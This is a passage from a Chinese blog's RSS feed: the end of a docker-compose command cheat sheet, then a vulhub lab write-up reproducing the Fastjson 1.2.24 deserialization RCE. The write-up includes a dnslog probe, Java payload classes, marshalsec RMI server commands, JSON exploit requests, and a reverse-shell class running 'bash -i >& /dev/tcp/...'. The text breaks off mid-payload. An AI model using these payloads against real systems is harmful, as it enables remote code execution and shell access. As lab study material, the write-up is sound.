class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 查看帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose -h                           &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 启动所有docker-compose服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose up   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 启动所有docker-compose服务并后台运行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose up -d          &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#强制终止正在运行的服务容器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose kill&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 停止并删除容器、网络、卷、镜像&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose down&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 进入容器实例内部yml文件中写的服务id /bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose exec  yml里面的服务id         &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 展示当前docker-compose编排过的运行的所有容器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose ps&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 展示当前docker-compose编排过的容器进程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose top                     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 查看容器输出日志&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose logs  yml里面的服务id     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 检查配置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose config&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 检查配置，有问题才有输出&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose config -q  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 启动服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 停止服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose stop      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 重启服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose restart   &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;参考文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/89587030&#34;&gt;https://zhuanlan.zhihu.com/p/89587030&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/187505981&#34;&gt;https://zhuanlan.zhihu.com/p/187505981&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/620097083&#34;&gt;https://zhuanlan.zhihu.com/p/620097083&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Prince_WCS/article/details/135180728&#34;&gt;https://blog.csdn.net/Prince_WCS/article/details/135180728&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Pan_peter/article/details/128860771&#34;&gt;https://blog.csdn.net/Pan_peter/article/details/128860771&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_38924779/article/details/135035765&#34;&gt;https://blog.csdn.net/qq_38924779/article/details/135035765&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freecodecamp.org/chinese/news/how-to-remove-all-docker-images-a-docker-cleanup-guide/&#34;&gt;https://www.freecodecamp.org/chinese/news/how-to-remove-all-docker-images-a-docker-cleanup-guide/&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
            <title>【vulhub】Fastjson漏洞复现</title>
            <link>https://w-sqrt7.github.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
            <category>原创</category>
            <category>靶场</category>
            <category>vulhub</category>
            <pubDate>Thu, 25 Apr 2024 19:30:55 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;【vulhub】Fastjson漏洞复现&#34;&gt;&lt;a href=&#34;#【vulhub】Fastjson漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;【vulhub】Fastjson漏洞复现&#34;&gt;&lt;/a&gt;【vulhub】Fastjson漏洞复现&lt;/h1&gt;&lt;h1 id=&#34;1-2-24-rce&#34;&gt;&lt;a href=&#34;#1-2-24-rce&#34; class=&#34;headerlink&#34; title=&#34;1.2.24-rce&#34;&gt;&lt;/a&gt;1.2.24-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：&#34;&gt;&lt;a href=&#34;#漏洞原理：&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&amp;#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。&lt;/p&gt;
&lt;p&gt;使用AutoType功能进行序列号的JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的setter或者getter方法，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。&lt;/p&gt;
&lt;p&gt;常见的有sun官方提供的一个类com.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用！&lt;/p&gt;
&lt;p&gt;因为目标环境是Java 8u102，没com.sun.jndi.rmi.object.trustURLCodebase的限制，我们可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。&lt;/p&gt;
&lt;p&gt;影响范围：fastjson&amp;lt;&amp;#x3D;1.2.24&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现：&#34;&gt;&lt;a href=&#34;#漏洞复现：&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;实验前提：python3版本，java1.8版本&lt;/p&gt;
&lt;p&gt;java环境配置可参考文章：&lt;a href=&#34;https://blog.csdn.net/huayimy/article/details/130273362&#34;&gt;https://blog.csdn.net/huayimy/article/details/130273362&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;漏洞验证，利用dnslog等平台进行验证，BP抓包，修改为POST方法，修改Content-Type，放入payload，然后发送数据包&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;zeo&amp;quot;:&amp;#123;&amp;quot;@type&amp;quot;:&amp;quot;java.net.Inet4Address&amp;quot;,&amp;quot;val&amp;quot;:&amp;quot;dgs0uq.dnslog.cn&amp;quot;&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425203104478.png&#34; alt=&#34;image-20240425203104478&#34;&gt;&lt;/p&gt;
&lt;p&gt;漏洞利用，首先编译payload，利用&lt;code&gt;javac TouchFile.java&lt;/code&gt;命令，编译TouchFile.java文件，生成TouchFile.class文件，实际情况中需要将编译好的payload放在公网服务器上的，这里只是进行本地的验证尝试，理解即可。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// javac TouchFile.java&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.lang.Runtime;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.lang.Process;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class TouchFile &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    static &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Runtime rt = Runtime.getRuntime();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            String[] commands = &amp;#123;&amp;quot;touch&amp;quot;, &amp;quot;/tmp/successFrank&amp;quot;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Process pc = rt.exec(commands);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pc.waitFor();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; catch (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            // do nothing&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;这里就将kali作为放置payload的服务器，进入放置payload的目录，进行如下命令，启动服务&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -m http.server 5555&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425174031274.png&#34; alt=&#34;image-20240425174031274&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来使用marshalsec项目，启动RMI服务，监听9999端口，并制定加载远程类TouchFile.class&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &amp;quot;http://192.168.100.131:5555/#TouchFile&amp;quot; 9999&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/mbechler/marshalsec&#34;&gt;marshalsec项目下载地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;项目拉取下来后，在pom.xml所在目录，需要运行以下命令生成.jar文件（生成成功后位于此目录的target子目录下）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mvn clean package -DskipTests&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425174713907.png&#34; alt=&#34;image-20240425174713907&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后访问靶机，BP抓包，进行修改，将GET方法改为POST方法发送，修改Content-Type，加入payload，发送，观察响应报文发现已经成功创建。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;b&amp;quot;:&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;@type&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;dataSourceName&amp;quot;:&amp;quot;rmi://192.168.100.131:9999/TouchFile&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;autoCommit&amp;quot;:true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-25%20174829.png&#34; alt=&#34;屏幕截图 2024-04-25 174829&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425175440976.png&#34; alt=&#34;image-20240425175440976&#34;&gt;&lt;/p&gt;
&lt;p&gt;也可以直接进入docker容器中进行查看&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker exex –it 你的CONTAINER_ID bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;上面的过程理解之后&lt;/strong&gt;，然后开始尝试getshell，还是先编译payload，注意修改里面的ip和端口，还有一点需要注意，该Java文件的文件名需要和其内容中的public后的公共类相同，具体参考java的命名规范，否则是会出现编译错误的。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// javac GetShell.java&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.lang.Runtime;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.lang.Process;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class GetShell &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    static &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Runtime rt = Runtime.getRuntime();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            String[] commands = &amp;#123;&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.100.131/7777 0&amp;gt;&amp;amp;1&amp;quot;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Process pc = rt.exec(commands);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pc.waitFor();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; catch (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            // do nothing&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;nc开启监听，等待shell反弹&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 7777&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182200299.png&#34; alt=&#34;image-20240425182200299&#34;&gt;&lt;/p&gt;
&lt;p&gt;python开启http服务&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -m http.server 5555&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182338663.png&#34; alt=&#34;image-20240425182338663&#34;&gt;&lt;/p&gt;
&lt;p&gt;开启RMI服务，并监听9999端口，注意修改对应内容&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &amp;quot;http://192.168.100.131:5555/#GetShell&amp;quot; 9999 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182500809.png&#34; alt=&#34;image-20240425182500809&#34;&gt;&lt;/p&gt;
&lt;p&gt;BP抓包，改为POST请求方法，修改Content-Type，加入payload(注意修改内容)并发送&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;b&amp;quot;:&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;@type&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;dataSourceName&amp;quot;:&amp;quot;rmi://192.168.100.131:9999/GetShell&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        